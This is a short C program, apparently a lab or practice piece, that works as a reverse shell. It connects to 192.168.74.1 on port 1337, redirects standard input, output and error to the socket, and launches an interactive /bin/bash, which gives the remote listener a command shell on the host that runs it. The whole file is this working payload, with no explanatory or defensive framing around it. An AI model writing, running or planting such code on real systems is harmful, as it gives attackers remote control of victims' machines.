#include <unistd.h>
#include <sys/socket.h>
//#include <sys/types.h>
//#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdio.h>

int main() {
    int fork_val = 1; //fork();
    if (fork_val != 0) {
        char *args[] = {"/bin/bash", "-i", NULL};
        struct sockaddr_in adin;
        struct hostent *server;

        server = gethostbyname("192.168.74.1");
        printf("got hostbyname\n");

        adin.sin_family = AF_INET;
        adin.sin_port = htons(1337);
        memcpy(&adin.sin_addr.s_addr, server->h_addr, server->h_length);
        memset(adin.sin_zero, 0, 8);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (!connect(sock, (struct sockaddr *)&adin, sizeof(adin))) {

        printf("connected!\n");
        
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        execv(args[0], args);
	} else {
	    printf("error on connect\n"); 
        }
    } else {
        printf("fork_val %d\n", fork_val);
    }
    return 0;
}
